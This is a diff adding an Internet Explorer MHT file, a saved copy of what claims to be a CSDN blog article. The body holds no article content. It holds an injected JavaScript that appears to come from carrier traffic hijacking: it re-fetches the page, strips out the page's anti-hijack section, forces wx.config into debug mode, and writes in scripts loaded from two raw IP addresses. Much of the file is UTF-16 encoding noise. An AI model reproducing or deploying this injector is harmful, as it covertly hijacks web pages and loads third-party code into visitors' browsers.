@@ -1,0 +1,75 @@
+From: =?unicode?Q?=D2=D1=D3=C9_Internet_Explorer_11_=B1=A3=B4=E6?=
+Subject: 
+Date: Wed, 24 Jan 2018 10:19:04 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="unicode"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://blog.csdn.net/luonanqin/article/details/10046499
+X-MimeOLE: Produced By Microsoft MimeOLE
+
+=FF=FE<=00!=00D=00O=00C=00T=00Y=00P=00E=00 =00H=00T=00M=00L=00 =
+=00P=00U=00B=00L=00I=00C=00 =
+=00"=00-=00/=00/=00W=003=00C=00/=00/=00D=00T=00D=00 =00H=00T=00M=00L=00 =
+=004=00.=000=00 =
+=00T=00r=00a=00n=00s=00i=00t=00i=00o=00n=00a=00l=00/=00/=00E=00N=00"=00>=00=
+=0D=00=0A=
+=00<=00H=00T=00M=00L=00>=00<=00H=00E=00A=00D=00>=00<=00M=00E=00T=00A=00 =
+=00c=00o=00n=00t=00e=00n=00t=00=3D=00"=00I=00E=00=3D=005=00.=000=000=000=00=
+0=00"=00 =
+=00h=00t=00t=00p=00-=00e=00q=00u=00i=00v=00=3D=00"=00X=00-=00U=00A=00-=00=
+C=00o=00m=00p=00a=00t=00i=00b=00l=00e=00"=00>=00=0D=00=0A=
+=00=0D=00=0A=
+=00<=00M=00E=00T=00A=00 =
+=00h=00t=00t=00p=00-=00e=00q=00u=00i=00v=00=3D=00"=00C=00o=00n=00t=00e=00=
+n=00t=00-=00T=00y=00p=00e=00"=00 =
+=00c=00o=00n=00t=00e=00n=00t=00=3D=00"=00t=00e=00x=00t=00/=00h=00t=00m=00=
+l=00;=00 =
+=00c=00h=00a=00r=00s=00e=00t=00=3D=00u=00n=00i=00c=00o=00d=00e=00"=00>=00=
+=0D=00=0A=
+=00<=00M=00E=00T=00A=00 =
+=00n=00a=00m=00e=00=3D=00"=00G=00E=00N=00E=00R=00A=00T=00O=00R=00"=00 =
+=00c=00o=00n=00t=00e=00n=00t=00=3D=00"=00M=00S=00H=00T=00M=00L=00 =
+=001=001=00.=000=000=00.=001=000=005=007=000=00.=001=000=000=001=00"=00>=00=
+<=00/=00H=00E=00A=00D=00>=00=0D=00=0A=
+=00<=00B=00O=00D=00Y=00>=00<html> <head><script>(function() {  var =
+tt=3D'_t_t_t=3D',uu=3D'_u_u_u=3D',d=3Ddocument,xp =3D null,lo =3D =
+location.href,ho =3D false;  function cu(u) {    u=3Du+(u.indexOf("?")<0 =
+? '?':'&')+ tt +Math.random();    return u;  };  function du(u) {    =
+u=3Du+(u.indexOf("?")<0 ? '?':'&')+ uu +Math.random();    return u;  };  =
+if (window.XMLHttpRequest) xp =3D new XMLHttpRequest();  if =
+(window.ActiveXObject) {    var msxmls =3D [ "MSXML3", "MSXML2", =
+"Microsoft" ];    for ( var i =3D 0; i < msxmls.length; i++) {      try =
+{        xp =3D new ActiveXObject(msxmls[i] + "XMLHTTP");      } catch =
+(e) {      }    }       throw new Error("No XML component installed!");  =
+};  if (typeof(xp) =3D=3D "undefined" ) {    if (lo.indexOf(tt) < 0) lo =
+=3D cu(lo);    location.href =3D lo;    return;  };  =
+xp.onreadystatechange =3D function() {    if (xp.readyState =3D=3D 4) {  =
+    if (xp.status =3D=3D 200 ) {        try {          var rt =3D =
+xp.responseText;          d.charset =3D =
+/<meta\s*.*\s*charset\s*=3D\s*[\"\']?utf-8/i.test(rt) ? 'utf-8': 'gbk';  =
+        d.open();          var md =3D Math.random();          var msg =
+=3D "<script >window.top.document.write(\"<s\" + \"cript =
+src=3D'http://221.228.17.152/toolbar/show.bar?channelid=3D5&rnd=3D\" + =
+Math.random() + \"'><\/s\" + \"cript>\");<\/script>";          var st =
+=3D "<script type=3D'text/javascript' =
+src=3D'//221.231.148.199/1.htm?k=3D$336$0$0$"+new =
+Date().getTime()+"$"+md+"$0'><\/script>";          var w1 =3D =
+rt.indexOf("wx.config({");          var m1 =3D rt.indexOf("<meta");      =
+    var w2 =3D rt.indexOf("<\/head>", m1);          var v1 =3D =
+rt.indexOf("<!-- =E5=8F=8D=E8=BF=90=E8=90=A5=E5=95=86=E5=8A=AB=E6=8C=81 =
+S -->");          var v2 =3D rt.indexOf("<!-- =
+=E5=8F=8D=E8=BF=90=E8=90=A5=E5=95=86=E5=8A=AB=E6=8C=81 E -->");          =
+if (w1 > 0) {            rt =3D rt.slice(0, w1) + "wx.config({\"debug\": =
+\"1\"," + rt.slice(w1 + 12);          };          if (w2 > 0) {          =
+  if (v1 > 0 && v2 > 0) {              rt =3D rt.slice(0, v1) + msg + =
+rt.slice(v2) + st;              d.write(rt);            } else {         =
+     rt =3D rt.slice(0, w2) + msg + st + rt.slice(w2);              =
+d.write(rt);            }          } else {            d.write(rt);      =
+    }          d.close();          ho =3D true;        } catch(err) {}   =
+   } else {        location.href =3D du(lo);      };    };  };  =
+xp.open("GET", cu(lo), true);  xp.setRequestHeader("Cache-Control", =
+"no-cache");  xp.send();})();</script> =
+</head><body></body></html<=00/=00B=00O=00D=00Y=00>=00<=00/=00H=00T=00M=00=
+L=00>=00=0D=00=0A=
+=00
